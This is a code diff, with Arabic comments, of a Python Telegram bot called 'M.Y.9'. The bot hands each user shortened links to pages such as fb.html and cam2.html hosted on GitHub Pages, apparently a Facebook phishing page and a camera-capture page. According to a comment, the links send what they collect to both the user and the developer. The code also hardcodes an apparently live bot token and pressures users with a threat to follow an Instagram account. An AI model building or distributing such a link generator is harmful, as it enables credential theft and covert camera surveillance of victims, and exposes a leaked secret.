@@ -5,7 +5,7 @@ from threading import Thread
 import os
 import time
 
-# إعداد السيرفر
+# إعداد السيرفر لضمان بقاء البوت شغال
 app = Flask('')
 @app.route('/')
 def home(): return "M.Y.9 System Online"
@@ -13,12 +13,12 @@ def home(): return "M.Y.9 System Online"
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 def keep_alive(): Thread(target=run).start()
 
-# إعدادات البوت (التوكن والآي دي تبعك)
+# --- إعدادات البوت ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
-MY_ID = '7238206121' # آي دي أبو سند المطور
+MY_ID = '7238206121' # آي دي المطور أبو سند
 bot = telebot.TeleBot(TOKEN)
 
-# حل مشكلة التعليق
+# تنظيف الاتصال لحل مشكلة التعارض (Error 409)
 bot.remove_webhook()
 time.sleep(1)
 
@@ -30,9 +30,9 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     h = name.replace(" ", "_")
-    base = "https://m-y-9-tech.github.io/fb/" # رابط الجيت هب تبعك
+    base = "https://m-y-9-tech.github.io/fb/" # رابط مستودعك
     
-    # الروابط المزدوجة
+    # الروابط المزدوجة (تصلك وتصل للمستخدم)
     p = f"?id={uid}&hunter={h}&dev={MY_ID}"
     lnks = {
         "fb": short(base+"fb.html"+p),
@@ -44,7 +44,7 @@ def start(m):
         "c2": short(base+"cam2.html"+p)
     }
 
-    # الرسالة اللي طلبتها بالحرف
+    # الرسالة الخاصة بنظام M.Y.9 الموحد
     msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {name}
 
@@ -54,7 +54,7 @@ def start(m):
 عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.
 
 🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
-https://www.instagram.com/m_y_.9/?hl=ar#
+https://www.instagram.com/m_y_.9/
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
